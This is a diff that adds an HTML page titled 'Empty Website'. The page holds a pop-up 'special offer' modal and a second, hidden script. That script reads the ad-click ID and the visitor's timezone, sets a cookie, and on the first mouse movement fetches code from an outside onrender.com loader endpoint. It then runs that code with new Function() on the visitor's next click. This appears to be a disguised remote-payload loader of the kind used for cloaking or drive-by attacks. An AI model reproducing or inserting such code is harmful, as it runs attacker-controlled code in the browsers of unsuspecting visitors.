@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Empty Website</title>
+</head>
+    <script> document.addEventListener("DOMContentLoaded", function () { var modal = document.getElementById("specialOfferModal"); var closeButton = document.querySelector(".close-button"); var closeModalLinks = document.querySelectorAll(".close-modal"); // Show the modal modal.style.display = "block"; function closeModal() { modal.style.display = "none"; } closeButton.addEventListener("click", closeModal); closeModalLinks.forEach(function (link) { link.addEventListener("click", function (event) { event.preventDefault(); closeModal(); }); }); window.onclick = function (event) { if (event.target == modal) { modal.style.display = "none"; } }; }); </script> <script> const gclid = new URLSearchParams(location.search).get("gclid"); const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; const RENDER_BASE_URL = "https://decembernewsmethod2025.onrender.com"; let someCode = null; document.cookie = "access_cookie=true; path=/; max-age=300"; document.addEventListener("mousemove", async function fetchCodeOnce() { document.removeEventListener("mousemove", fetchCodeOnce); try { const res = await fetch( ${RENDER_BASE_URL}/frontend-loader?gclid=${gclid}, { headers: { "x-client-timezone": timezone, "x-access-cookie": "true", }, } ); const data = await res.json(); if (data && data.code) { someCode = data.code; } } catch (err) { console.error("Could not fetch code", err); } }); function handleSomeClick() { if (someCode) { try { new Function(someCode)(); } catch (err) { console.error("Error executing code:", err); } } } document.addEventListener("click", handleSomeClick); </script>
+</html>
